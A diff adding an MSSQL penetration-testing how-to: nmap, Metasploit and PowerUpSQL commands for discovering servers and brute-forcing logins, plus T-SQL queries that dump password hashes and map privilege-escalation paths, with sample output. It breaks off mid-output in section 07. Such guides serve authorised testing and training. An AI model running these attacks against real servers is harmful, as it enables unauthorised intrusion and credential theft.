@@ -1,0 +1,1202 @@
+*****  MSSQL DATABASE PENETRATION TESTING (HOW TO) *****  
+
+============================================================================================================
+INDEX
+============================================================================================================
+01. Reminder (definitions)
+02. MSSQL Database Penetration Testing - List of attacks
+03. How to perform a network ports scan to locate an MSSQL Database
+04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+05. How to identify MSSQL database vulnerabilities due to missing security patches
+06. How to log into a MSSQL Database using valid credentials
+07. How to identify and exploit database and OS privileges escalation vulnerabilities
+08. How to dump and crack MSSQL password hashes
+
+
+============================================================================================================
+01. REMINDER - definitions
+============================================================================================================
+• SCHEMA
+A schema is a collection of logical structures of data, or schema objects. 
+A schema is owned by a database user and has the same name as that user. 
+Each user owns a single schema. Schema objects can be created and manipulated with SQL
+
+• TABLES
+Tables are the basic unit of data storage in an MS SQL Database. Data is stored in rows and columns. 
+
+• VIEWS
+Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. 
+Views are not updatable.
+
+• TRANSACT-SQL
+Transact-SQL (T-SQL) is Microsoft's and Sybase's proprietary extension to the SQL (Structured Query Language) used to interact with relational databases.
+T-SQL expands on the SQL standard to include procedural programming, local variables, various support functions for string processing, date processing, mathematics, etc. 
+Transact-SQL is central to using Microsoft SQL Server.
+All applications that communicate with an instance of SQL Server do so by sending Transact-SQL statements to the server, regardless of the user interface of the application.
+
+• TRANSACTIONS
+A transaction is a unit of work that is performed against a database. 
+Transactions are units or sequences of work accomplished in a logical order, whether in a manual fashion by a user or automatically by some sort of a database program.
+
+• STORED PROCEDURE
+A stored procedure is a set of Structured Query Language (SQL) statements with an assigned name, which are stored in a relational database management system as a group,
+so it can be reused and shared by multiple programs.
+
+• LINKED SERVERS (DATABASE LINKs)
+linked servers are configured to enable the Database Engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle. 
+
+• SYNONYM
+Synonyms are a powerful feature of MS SQL and other SQL-compliant relational database systems. 
+They are used as a database shorthand. They make it possible to shorten the specification of long or complex object names. 
+This is especially useful for shared tables or views. 
+In addition, the use of DATABASE LINKS in synonyms allows transparent access to other databases on other nodes or even other entire systems halfway around the globe. 
+
+• DATABASE
+A database is the set of files where application data (the reason for a database) and meta data is stored. 
+
+• INSTANCE
+An instance is the software (and memory) that MS SQL uses to manipulate the data in the database. In order for the instance to be able to manipulate that data, the instance must open the database. A database can be opened (or mounted) by more than one instance, however, an instance can open at most one database. 
+
+• PUBLIC ROLE
+The public role is contained in every database, which includes system databases. It cannot be dropped and you cannot add or remove users from it. 
+Permissions granted to the public role are inherited by all other users and roles because they belong to the public role by default.
+Grant public only the permissions you want all users to have.
+
+• SYSADMIN PRIVILEGES
+The sysadmin fixed server role encompasses all other roles and has unlimited scope.
+
+• DBO USER vs DB_OWNER role 
+The dbo (or database owner) is a user account that has implied permissions to perform all activities in the database.
+Members of the sysadmin fixed server role are automatically mapped to dbo.
+The dbo user account is frequently confused with the db_owner fixed database role. The scope of db_owner is a database; the scope of sysadmin is the whole server. 
+Membership in the db_owner role does not confer dbo user privileges.
+
+• 3 types of accounts can be used to login to a MSSQL database depending of its configuration: 
+  + Domain windows accounts
+  + Local Windows accounts 
+  + SQL accounts
+  
+• In order to log into an MSSQL database you need the following information:
+  + IP address
+  + Port (default port: 1433)
+  + Instance
+  + SQL or Windows account's login and password
+
+
+============================================================================================================
+02. MSSQL Database Penetration Testing - List of attacks
+============================================================================================================
+
+Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
+------------------------------------------------------------------------------------------------------------
+• Password brute-force attack to identify default or trivial database credentials (SQL accounts)
+• Kerberoasting attack to recover Windows credentials used to run MSSQL database instances
+• SQL injection in a Web application that allow you to run unauthorized SQL queries to a MSSQL database
+• You have compromised a server and you found clear-text database credentials hardcoded in configuration files (web.config),  scripts, log files or application source code. 
+• Man-In-The-Middle attack to eavesdropp clear-text or hashed SQL/Windows credentials (e.g. ARP cache poisoning, LLMNR/NBTNS poisonning)
+• Run a remote exploit (0-day or missing patches).
+• …
+
+Grey-box penetration test (FROM (low privileged) database user TO privileged database user OR database administrator (DBA))
+---------------------------------------------------------------------------------------------------------------------------
+• Identify and exploit privileges escalation vulnerabilities that will allow you to become directly database administrator (i.e. sysadmin). 
+  For example a regular db user with the following combinations of database system privileges may very often become DBA:
+	+ IMPERSONATE permission ("EXECUTE AS LOGIN/USER" and/or "EXECUTE AS ANY LOGIN/USER") on any sysadmin logins
+	+ DB_OWNER role in any "trustworthy" databases owned by a sysadmin user 
+	+ If the XP_FILEEXIST and/or XP_DIRTREE stored procedures are executable, then it is possible to capture the NETLM authentication password hash of the SQL Server service account.
+	+ member of the 'securityadmin' role
+	+ ALTER SERVER ROLE permission
+
+• Identify and exploit privileges escalation vulnerabilities that will allow you to get unauthorized access to sensitive data belonging to other users/schemas. 
+  For example a regular db user with the following privilege(s) can escalate its privileges and access to other users’ data:
+	+ IMPERSONATE permission (EXECUTE AS LOGIN/USER)	
+	+ Identify and exploit insecure ‘Database Links / Linked servers’ (if any)
+	
+• Identify and exploit privileges escalation vulnerabilities due to weak permissions that will allow you to run unauthorized OS commands or scripts on the Windows server underlying 
+  the database. The OS commands (or reverse shell) will be run with the SQL Server service account who owns the database and has DBA privileges.
+  For example a db user can intent to run unauthorized OS commands as the SQL Server service account on a Windows server hosting an MSSQL database using different techniques:	
+	+ Run OS commands via the extended stored procedure xp_cmdshell.
+  + Run OS commands via external scripting using Python. 
+	+ Run OS commands via Ole Automation Procedures.
+	+ Run OS commands via external scripting using R.
+	+ Run OS commands via CLR assemblies.
+	+ Run OS commands as the SQL Server Agent service account via Agent Jobs from the CMDExec, PowerShell, ActiveX:JScript, and ActiveX:VBScript subsystems.
+	
+• Identify and exploit insecure ‘Database Links / Linked servers’ (if any)
+• Run an MS SQL database local exploit (0 day or missing patches)
+• Brute-force attack (default or easy guessable credentials)
+• Capture SMB Authentication password hash and crack it.
+
+
+============================================================================================================
+03. How to perform a network ports scan to locate an MS SQL Database (e.g. TCP port: 1433 / UDP port: 1434)
+============================================================================================================
+
+1. NMAP (https://nmap.org)
+-----------------------------------------------------------------------------------
+• Identify SQL Servers listening on the TCP port 1433. 
+  pentester@LinuxVM > nmap -Pn -vv -sV -p 1433 192.168.1.177		
+  
+    PORT     STATE SERVICE  VERSION
+    1433/tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.3128; SP1+
+    <SNIP>
+
+• Identify SQL Servers responding to requests via the UDP protocol on port 1434.
+  pentester@LinuxVM > nmap -Pn -vv -sU -p 1434 192.168.1.38
+
+• The ‘broadcast-ms-sql-discover’ module can be used to discover Microsoft SQL servers in the same broadcast domain
+  pentester@LinuxVM > nmap --script broadcast-ms-sql-discover
+
+
+2. Metasploit - ‘mssql_ping’ module (https://www.rapid7.com/products/metasploit/)
+-----------------------------------------------------------------------------------
+• The “mssql_ping” module queries a host or range of hosts on UDP port 1434 to determine the listening TCP port of any MSSQL server, if available.
+  MSSQL randomizes the TCP port that it listens on so this is a very valuable module in the Framework.
+
+  pentester@LinuxVM > msfconsole
+	msf > use auxiliary/scanner/mssql/mssql_ping
+	msf auxiliary(mysql_ping) > show options
+	Module options (auxiliary/scanner/mssql/mssql_ping):
+   	Name                 Current Setting  Required  Description
+   	----                 ---------------  --------  -----------
+   	PASSWORD                              no        The password for the specified username
+   	RHOSTS                                yes       The target address range or CIDR identifier
+   	TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   	THREADS              1                yes       The number of concurrent threads
+   	USERNAME             sa               no        The username to authenticate as
+   	USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+
+
+3. PowerUPsql (https://github.com/NetSPI/PowerUpSQL)
+-----------------------------------------------------------------------------------
+C:\> runas /noprofile /netonly /user:domain\user PowerShell.exe -nop -exec bypass
+PS C:\> cd /Users/Pen003/Documents/Tools/PowerUPsql-master/
+PS C:\> Import-Module .\PowerUpSQL.psd1						--Download the project and import it.
+PS C:\> Get-Help Get-SQLInstanceScanUDP
+ 
+PS C:\>: Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName WIN-F820SQBBVJR 
+PS C:\>: Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP -Verbose -Threads 10 
+PS C:\>: Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP -Verbose -Threads 10 | Select-Object Instance -ExpandProperty Instance | Out-File c:\temp\test.txt
+
+PS C:\>: Get-SQLInstanceBroadcast 						-- Returns SQL Server instances from UDP broadcast.
+PS C:\>: Get-SQLInstanceDomain -Verbose | Format-Table -AutoSize		-- Discover domain SQL Server Instances
+PS C:\>: Get-SQLInstanceDomain -Verbose -DomainAccount sqlsvc			-- List SQL Servers using a specific domain account	
+
+
+Finding Domain SQL Servers to Log Into
+> https://blog.netspi.com/identifying-domain-sql-servers-configured-with-weak-passwords-on-scale-using-powerupsql/
+
+
+• Tips: if you can list the servers belonging to a Windows domain, you should be able to identify database server based on their naming convention.
+Examples:
+	SQLDB-PRD-01.company-domain
+	DBSRV-PRD.company-domain
+	MSSQLSRV2K14-PRD-.company-domain
+  WinSql2K12-12.company-domain
+	<snip>
+
+
+============================================================================================================
+04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+============================================================================================================
+
+1. NMAP - ‘ms-sql-brute’ and ‘ms-sql-empty-password’ modules (https://nmap.org) 
+-----------------------------------------------------------------------------------
+
+• This module attempts to authenticate to a Microsoft SQL Server using an empty password for the sysadmin (sa) account.
+  pentester@LinuxVM > nmap -p 445 --script ms-sql-empty-password 192.168.1.38
+
+• This module performs password guessing against a Microsoft SQL Server (ms-sql).
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-brute --script-args userdb=C:/Users/Pen003/Desktop/user.txt,passdb=C:/Users/Pen003/Desktop/pass.txt 192.168.1.38
+
+	PORT     STATE SERVICE
+	1433/tcp open  ms-sql-s
+	| ms-sql-brute: 
+	|   [192.168.1.38:1433]
+	|     Credentials found:
+	|_      sa:Test1234 => Login Success
+
+
+2. Metasploit - ‘mssql_login’ module (https://www.rapid7.com/products/metasploit/)
+-----------------------------------------------------------------------------------
+• This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).
+ 
+  pentester@LinuxVM > msfconsole
+  pentester@LinuxVM > use auxiliary/scanner/mssql/mssql_login
+  pentester@LinuxVM > msf auxiliary(mssql_login) > show options
+
+  Name             Current Setting                                        Required  Description
+  ----             ---------------                                        --------  -----------
+  HEX2BINARY       							  no        The path to the hex2binary script on the disk
+  MSSQL_PASS                                                              no        The password for the specified username
+  MSSQL_PASS_FILE                                                         no        A dictionary of passwords to perform a bruteforce attempt
+  MSSQL_USER       sa                                                     no        The username to authenticate as
+  RHOSTS                                                                  yes       The target address range or CIDR identifier
+  RPORT            1433                                                   yes       The target port
+  THREADS          1                                                      yes       The number of concurrent threads
+
+
+
+3. PowerUP Sql - 'Invoke-SQLAuditWeakLoginPw' module (https://github.com/NetSPI/PowerUpSQL) 
+---------------------------------------------------------------------------------------------  
+• This can be used for online dictionary attacks. It also support auto-discovery of SQL Logins for testing if you already have a least privilege account.
+
+  C:\> runas /noprofile /netonly /user:domain\user PowerShell.exe -nop -exec bypass
+  PS C:\> cd /Users/Pen003/Documents/Tools/PowerUPsql-master/
+  PS C:\> Import-Module .\PowerUpSQL.psd1						--Download the project and import it.
+  PS C:\> Get-Help Invoke-SQLAuditWeakLoginPw
+
+  PS C:\> Invoke-SQLAuditWeakLoginPw -Verbose -Instance server\instance -Exploit 
+
+  PS C:\Users\Pen003\Documents\Tools\PowerUPsql-master> Invoke-SQLAuditWeakLoginPw -Verbose -Instance WIN-F820SQBBVJR -Exploit -Username sa -Password Test1234
+	COMMENTAIRES : WIN-F820SQBBVJR : START VULNERABILITY CHECK: Weak Login Password
+	COMMENTAIRES : WIN-F820SQBBVJR : CONNECTION SUCCESS.
+	COMMENTAIRES : WIN-F820SQBBVJR - Getting supplied login...
+	COMMENTAIRES : WIN-F820SQBBVJR - Getting list of logins...
+	COMMENTAIRES : WIN-F820SQBBVJR - Performing dictionary attack...
+	COMMENTAIRES : WIN-F820SQBBVJR - Failed Login: User = sa Password = sa
+	COMMENTAIRES : WIN-F820SQBBVJR - Failed Login: User = ##MS_PolicyTsqlExecutionLogin## Password = ##MS_PolicyTsqlExecutionLogin##
+	COMMENTAIRES : WIN-F820SQBBVJR - Failed Login: User = ##MS_PolicyEventProcessingLogin## Password = ##MS_PolicyEventProcessingLogin##
+	COMMENTAIRES : WIN-F820SQBBVJR - Failed Login: User = Batchsvc Password = Batchsvc
+	COMMENTAIRES : WIN-F820SQBBVJR : COMPLETED VULNERABILITY CHECK: Weak Login Password
+  
+
+============================================================================================================
+05. How to identify MS SQL database vulnerabilities due to missing security patches
+============================================================================================================
+
+1. NMAP - ‘ms-sql-info’ module (https://nmap.org) 
+--------------------------------------------------------------------
+• This module attempts to determine configuration and version information for Microsoft SQL Server instances.
+
+  pentester@LinuxVM > nmap -p 445 --script ms-sql-info 192.168.1.177
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.079s latency).
+	PORT    STATE SERVICE
+	445/tcp open  microsoft-ds
+	MAC Address: 00:24:D7:5C:6E:48 (Intel Corporate)
+	Host script results:
+	| ms-sql-info: 
+	|   [192.168.1.41:1433]
+	|     Version: Microsoft SQL Server 2012 RTM+
+	|       Version number: 11.00.3128.00
+	|       Product: Microsoft SQL Server 2012
+	|       Service pack level: RTM
+	|       Post-SP patches applied: Yes
+	|_    TCP port: 1433
+
+
+2. NMAP - ‘ms-sql-query’ module  (https://nmap.org) 
+--------------------------------------------------------------------
+• This module allows to run queries against a Microsoft SQL Server (ms-sql).
+
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=Test1234,ms-sql-query.query="SELECT @@version version" 192.168.1.38
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.060s latency).
+	PORT     STATE SERVICE
+	1433/tcp open  ms-sql-s
+	| ms-sql-query: 
+	|   [192.168.1.41:1433]
+	|     Query: SELECT @@version version
+	|       version
+	|       =======
+	|       Microsoft SQL Server 2012 (SP1) - 11.0.3128.0 (X64) 
+	|       	Dec 28 2012 20:23:12 
+	|       	Copyright (c) Microsoft Corporation
+	|_      	Enterprise Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor)
+	
+	
+3. PowerUPsql (https://github.com/NetSPI/PowerUpSQL)
+--------------------------------------------------------------
+• Get general server information such as SQL/OS versions, service accounts, sysdmin access etc.
+
+  C:\> runas /noprofile /netonly /user:domain\user PowerShell.exe -nop -exec bypass
+  PS C:\>: cd /Users/Pen003/Documents/Tools/PowerUPsql-master/
+  PS C:\>: Import-Module .\PowerUpSQL.psd1		--Download the project and import it.	
+		
+  PS C:\Users\Pen003\Documents\Tools\PowerUPsql-master> Get-SQLServerInfo -Verbose -Instance "WIN-F820SQBBVJR"  -Username sa -Password Test1234
+
+	COMMENTAIRES : WIN-F820SQBBVJR : Connection Success.
+	ComputerName           : WIN-F820SQBBVJR
+	Instance               : WIN-F820SQBBVJR
+	DomainName             : WORKGROUP
+	ServiceProcessID       : 1372
+	ServiceName            : MSSQLSERVER
+	ServiceAccount         : NT Service\MSSQLSERVER
+	AuthenticationMode     : Windows and SQL Server Authentication
+	Clustered              : No
+	SQLServerVersionNumber : 11.0.3128.0
+	SQLServerMajorVersion  : 2012
+	SQLServerEdition       : Enterprise Edition (64-bit)
+	SQLServerServicePack   : SP1
+	OSArchitecture         : X64
+	OsMachineType          : ServerNT
+	OSVersionName          : Windows Server 2012 R2 Standard
+	OsVersionNumber        : 6.2
+	Currentlogin           : sa
+	IsSysadmin             : Yes
+	ActiveSessions         : 1	
+	
+
+============================================================================================================
+06. How to log into a MSSQL Database using valid credentials
+============================================================================================================
+
+1. SQLCMD (Microsoft command line client)
+---------------------------------------------------------------------------
+• The sqlcmd utility is a command-line utility for ad hoc, interactive execution of Transact-SQL statements and scripts and for automating Transact-SQL scripting tasks.
+  To use sqlcmd interactively, or to build script files to be run using sqlcmd, users must understand Transact-SQL.
+
+  C:\> sqlcmd -U username -S server\instance
+  C:\> sqlcmd -U sa -S WIN-F820SQBBVJR
+	1> select @@version; 
+	2> GO
+	1> PRINT SUSER_NAME();
+	2> GO
+	
+  C:\> sqlcmd -i c:\sql\myquery.sql -o c:\sql\myoutput.txt
+
+  C:\>runas /user:WIN-F820SQBBVJR\HR-app sqlcmd.exe -S WIN-F820SQBBVJR 
+
+• Links: https://www.microsoft.com/en-us/download/details.aspx?id=53591 / https://www.microsoft.com/en-us/download/details.aspx?id=53339 / https://www.microsoft.com/en-us/download/details.aspx?id=8483
+
+
+2. SQL Server Management Studio (SSMS) (Microsoft GUI client)
+--------------------------------------------------------------
+• SSMS is an integrated environment for managing any SQL infrastructure, from SQL Server to SQL Database. 
+  SSMS provides tools to configure, monitor, and administer instances of SQL.
+  Use SSMS to deploy, monitor, and upgrade the data-tier components used by your applications, as well as build queries and scripts.
+
+• https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms
+
+
+
+3. DbVisualizer (GUI multi-database client - https://dbvis.com)
+-----------------------------------------------------------------
+pentester@LinuxVM > sudo find / -name dbvis
+		/root/DbVisualizer/wrapper/classes/com/onseven/dbvis
+		/root/DbVisualizer/dbvis
+		/usr/local/bin/dbvis
+
+pentester@LinuxVM > sudo su
+root@LinuxVM > cd /root/DbVisualizer/
+root@LinuxVM > ./dbvis
+
+• On the GUI
+  > Go to "TOOLS"
+  > Go to "New Connection Wizard"
+  > Enter "MSSQL pentest training"
+  > Select Database Connector "MSSQL"
+  > Enter all the right info
+  > "Ping Server"
+  > "Connect"
+
+
+4. NMAP - 'ms-sql-query' module
+---------------------------------------
+• This module allows to run queries against a Microsoft SQL Server (ms-sql).
+
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=Test1234,ms-sql-query.query="SELECT * FROM master..syslogins" 192.168.1.41
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.14s latency).
+	PORT     STATE SERVICE
+	1433/tcp open  ms-sql-s
+	| ms-sql-query: 
+	|   [192.168.1.41:1433]
+	|     Query: SELECT * FROM master..syslogins
+	|       sid	status	createdate	updatedate	accdate	totcpu	totio	spacelimit	timelimit <SNIP> 
+	|       ===	======	==========	==========	=======	======	=====	==========	=========	
+	|       0x01	9	Apr 08, 2003 09:01:14	Oct 09, 2017 09:08:20	Apr 08, 2003 	 			
+		09:01:14						0	
+		<SNIP>		
+		sa	master	\x02b \xF9\xF5\x9D\x7F\xC7>%\xA2\x99\x04\xCB\xFB\x0C1\x90 !YUNK$Gd\xB3Er]PM\xBF\x9A
+		us_english	0	1	00	0	1	0	0	0	0	0	0	0	sa
+	|       0x0106000000000009010000005FB6DAC7F7DB546D706711B128B5063888B01770	10	Oct 09, 2017 06:55:03	Oct 09, 2017 			06:55:03	Oct 09, 2017 06:55:03	0	0	0	0	0					
+
+
+============================================================================================================
+07. How to identify and exploit MSSQL database and OS privileges escalation vulnerabilities
+============================================================================================================
+
+
+07.1. Check for various useful information (i.e. list of users, DB password policy, who is DBA...) 
+============================================================================================================
+
+Manual checks:
+----------------
+• RDP to the WIndows Server hosting the MS SQL database server
+   - Use the GUI "Microsoft SQL Management Studio"
+     + Security > Login > Select an account (right click) > Properties 
+	   + General = Authentication Mode, Enforce Password Policy...
+	   + Server Roles = "sysadmin" and/or "Public"...
+	   + User Mappings = which DB you have access to ...
+	   + Securables = Permissions granted to this accounts (in addition to group/role permissions)
+	   + Status: Account is enabled or disabled, account can "connect", Account can "login"
+	  
+   - Use the GUI "SQL server Configuration Manager"
+     + Protocols for SQL1 
+	   + Force Encryption (for selected instance) = No/Yes
+	   + Hide Instance = No/Yes 
+	   + Extended Protection = On/Off
+
+• SQL basic/usefull queries:
+
+  SQL> SELECT SYSTEM_USER;		  //Display the current user
+  SQL> SELECT @@version;		  //Display the database server version
+  SQL> exec xp_loginconfig;		  //Display login security configuration of MSQL Server
+  SQL> SELECT * FROM sys.syslogins	  //List of the accounts (Win and SQL)
+  SQL> SELECT * FROM sys.sql_logins;	  //Password hashes of the SQL account, account status...
+  SQL> SELECT * from sys.databases;	  //List the databases
+  SQL> SELECT * from sys.configurations;  //List various usefull configuration settings
+  SQL> SELECT * from sysoledbusers;	  //Contains one row for each user and password mapping for the specified linked server
+  SQL> SELECT HOST_NAME();		  //Display the Hostname and the IP address(es)
+
+  SQL> SELECT user, password FROM master.dbo.sysxlogins
+  SQL> SELECT name, password, LOGINPROPERTY(name, 'PasswordHash' ) hash FROM syslogins WHERE password IS NOT NULL; 
+
+  SQL> select name from sys.sql_logins union all select master.dbo.fn_varbintohexstr(password_hash)from sys.sql_logins  //How to dump password hashes from SQL Database Server 
+
+  SQL> SELECT * FROM sys.syslogins WHERE pwdcompare ('jAFeazaS0UudxF124356', password)=1   //How to list account which have the same password in SQL Database Server 
+
+
+  SQL> SELECT entity_name, permission_name FROM sys.fn_my_permissions(NULL, NULL);	//List the effective permissions of the current user on the server
+  SQL> SELECT  * FROM    fn_my_permissions('sp_MSforeachtable', 'OBJECT');
+
+  SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;		//Who has a particular priv sysadmin
+  SQL> SELECT name FROM master..syslogins WHERE securityadmin = 1;	//Who has a particular priv securityadmin
+  SQL> SELECT name FROM master..syslogins WHERE denylogin = 0;		//Who has a particular priv denylogin 
+  SQL> SELECT name FROM master..syslogins WHERE hasaccess = 1;		//Who has a particular priv hasaccess
+  SQL> SELECT name FROM master..syslogins WHERE isntname = 0;		//Who has a particular priv isntname 
+  SQL> SELECT name FROM master..syslogins WHERE isntgroup = 0;		//Who has a particular priv isntgroup 
+  SQL> SELECT name FROM master..syslogins WHERE serveradmin = 1;	//Who has a particular priv serveradmin
+  SQL> SELECT name FROM master..syslogins WHERE setupadmin = 1;		//Who has a particular priv setupadmin
+  SQL> SELECT name FROM master..syslogins WHERE processadmin = 1;	//Who has a particular priv processadmin 
+  SQL> SELECT name FROM master..syslogins WHERE diskadmin = 1;		//Who has a particular priv diskadmin
+  SQL> SELECT name FROM master..syslogins WHERE dbcreator = 1;		//Who has a particular priv dbcreator
+  SQL> SELECT name FROM master..syslogins WHERE bulkadmin = 1;		//Who has a particular priv bulkadmin
+
+  SQL> SELECT pr.name, pr.is_disabled, pr.is_fixed_role, pr.create_date, pr.modify_date, pr.default_database_name, owner.name AS owner_name FROM sys.server_principals AS pr JOIN sys.server_principals AS owner ON pr.owning_principal_id = owner.principal_id WHERE pr.type = 'R' ORDER BY name
+  SQL> SELECT role.name AS role_name, member.name AS member_name from sys.server_role_members JOIN sys.server_principals AS role ON sys.server_role_members.role_principal_id = role.principal_id JOIN sys.server_principals AS member ON sys.server_role_members.member_principal_id = member.principal_id
+  SQL> SELECT pr.name, pe.state_desc, pe.permission_name FROM sys.server_principals AS pr JOIN sys.server_permissions AS pe ON pe.grantee_principal_id = pr.principal_id WHERE pr.type = 'R' ORDER BY name
+  SQL> SELECT * from msdb..sysoperators;
+
+  SQL> SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN 'sysadmin' ELSE NULL END UNION SELECT CASE WHEN IS_MEMBER('db_owner') = 1 THEN 'db_owner' ELSE NULL END
+
+• Manual check to detect privilege escalation exploiting IMPERSONATE, ALTER SERVER ROLE, CONTROL SERVER permissions.
+  SQL> SELECT * FROM master.sys.server_permissions	//List all permissions and related users (field grantee_principal_id)
+  SQL> SELECT * FROM master.sys.server_principals	//List all user ids and accounts (principal_id)
+  Map grantee_principal_id with principal_id to identify the accounts having insecure permissions.
+
+
+List of sensitive privileges/roles that should be granted only to a limited list of privileged users:
+------------------------------------------------------------------------------------------------------
+• SYSADMIN role			-- Members of the sysadmin fixed server role can perform any activity in the server (i.e. they are DBA).
+• SECURITYADMIN role		-- Members of the securityadmin fixed server role manage logins and their properties. 
+				   They can GRANT, DENY, and REVOKE server-level permissions. 
+				   They can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. 
+				   Additionally, they can reset passwords for SQL Server logins.
+• BULKADMIN role + INSERT permission	-- The bulkadmin role allows users to insert the contents of any Windows local file into a table, which could jeopardize data integrity.
+					   Members of the bulkadmin fixed server role can run the BULK INSERT statement.
+• DBCREATOR role			-- Members of the dbcreator fixed server role can create, alter, drop, and restore any database.
+• CONTROL SERVER permission		-- By default 'CONTROL SERVER' permission grants access to everything like the 'SYSADMIN' fixed role. 
+					   However, the usefulness of 'CONTROL SERVER' permission comes with the ability to strip away permissions.
+					   E.g. it is possible to remove the ability to view databases on a SQL Server instance to a user who has the 'CONTROL SERVER' permission . 
+• DB_OWNER role		        	-- Members of the db_owner role can perform all configuration and maintenance activities on a particular database.
+• ALTER APPLICATION ROLE 		-- Change the name, password, or default schema of an application role.
+• ALTER SERVER role			-- Changes the membership of a server role or changes name of a user-defined server role.
+• ALTER ROLE 				-- Add members to a database role or changes the name of a user-defined database role.
+• ALTER ANY SERVER ROLE permission
+• ALTER LOGIN permission		-- Change the properties of a SQL Server login account (including changing its password)
+• ALTER User				-- Rename a database user or changes its default schema (including changing its password if you knew the current one)
+• ALTER ANY LOGIN permission		-- Allow to change the password of any SQL database user without knowing its current password
+• ALTER ANY USER permission		-- Allow to change the password of any SQL database user without knowing its current password
+• ALTER ANY DATABASE permission
+• IMPERSONATE ON ANY LOGIN permission (SQL Server 2014 and above) -- This Permission permits to impersonate any Login and User.
+• IMPERSONATE ON LOGIN privilege				  -- This Permission permits to impersonate one or several Logins and Users (it depends of the configuration).
+• CONTROL permission
+• TAKE OWNERSHIP permission
+• ALTER DATABASE ENCRYPTION KEY (Transact-SQL)			  -- Alter an encryption key and certificate that is used for transparently encrypting a database. 
+• ...
+ 
+• A combination of ALTER and REFERENCE permissions in some cases could allow the grantee to view data or execute unauthorized functions.
+  For example: A user with ALTER permission on a table and REFERENCE permission on a function can create a computed column over a function and have it be executed.
+  In this case, the user must also have SELECT permission on the computed column.
+ 
+
+Using tools..
+
+Automatic check with METASPLOIT - 'mssql_enum' module (https://www.rapid7.com/products/metasploit/)
+-------------------------------------------------------------------------------------------------------
+• Microsoft SQL Server Configuration Enumerator.
+  The “mssql_enum” is an admin module that will accept a set of credentials and query a MSSQL for various configuration settings.
+
+	pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/mssql/mssql_enum
+	      msf auxiliary(mssql_enum) > show options
+		
+		Module options (auxiliary/admin/mssql/mssql_enum):
+
+		Name                 Current Setting  Required  Description
+		----                 ---------------  --------  -----------
+		PASSWORD                              no        The password for the specified username
+		RHOST                                 yes       The target address
+		RPORT                1433             yes       The target port (TCP)
+		TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+		USERNAME             sa               no        The username to authenticate as
+		USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN o
+
+	msf auxiliary(mssql_enum) > run
+
+	Information collected:
+	[*] Database version
+	[*] Configuration parameters:
+		- C2 Audit Mode is Not Enabled
+		- xp_cmdshell is Not Enabled
+		- remote access is Enabled
+		- allow updates is Not Enabled
+		- Database Mail XPs is Not Enabled
+		- Ole Automation Procedures are Not Enabled
+	[*] List of databases on the server
+	[*] List of system Logins
+	[*] List of disabled Accounts:
+	[*] Password Expiration is not checked for...
+	[*] List of system Admin Logins
+	[*] List of windows Logins on this Server:
+	[*] List pf windows Groups that can logins on this Server:
+	[*] List of accounts with Username and Password being the same:
+	[*] List of accounts with empty password:
+	[*] List of stored Procedures with Public Execute Permission found:
+	[*] List of instances found on this server:MSSQLSERVER
+	<SNIP> 
+
+
+
+Metasploit - 'mssql_idf' module (https://www.rapid7.com/products/metasploit/)
+---------------------------------------------------------------------------------
+• The “mssql_idf” (Interesting Data Finder) module will connect to a remote MSSQL server using a given set of credentials and search for rows and columns with “interesting” names.
+  This information can help you fine-tune further attacks against the database.
+	
+	pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/mssql/mssql_idf
+	      msf auxiliary(mssql_idf) > show options
+  	      Module options (auxiliary/admin/mssql/mssql_idf):
+
+	      Name      Current Setting         Required  Description
+	      ----      ---------------         --------  -----------
+	      NAMES     passw|bank|credit|card  yes       Pipe separated list of column names
+	      PASSWORD                          no        The password for the specified username
+	      RHOST                             yes       The target address
+	      RPORT     1433                    yes       The target port
+	      USERNAME  sa                      no        The username to authenticate as
+
+
+Automatic check with NMAP - ‘ms-sql-hasdbaccess’ module (https://nmap.org) 
+---------------------------------------------------------------------------------
+• Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user has access to.
+
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=patrolsvc,mssql.password=patrol 192.168.1.177
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.062s latency).
+	PORT     STATE SERVICE
+	1433/tcp open  ms-sql-s
+	| ms-sql-hasdbaccess: 
+	|   [192.168.1.41:1433]
+	|       sa (Showing 5 first results)
+	|         dbname	owner
+	|         ======	=====
+	|         HR-Web-App	WIN-F820SQBBVJR\HR-app
+	|         ReportServer	WIN-F820SQBBVJR\Pentester
+	|_        ReportServerTempDB	WIN-F820SQBBVJR\Pentester
+
+	
+Automatic check with NMAP - ‘ms-sql-config’ module (https://nmap.org) 
+---------------------------------------------------------
+• Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers, and configuration settings.
+
+  pentester@LinuxVM > nmap -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssql.password=Test1234 192.168.1.177
+
+	Nmap scan report for 192.168.1.41
+	Host is up (0.17s latency).
+	PORT     STATE SERVICE
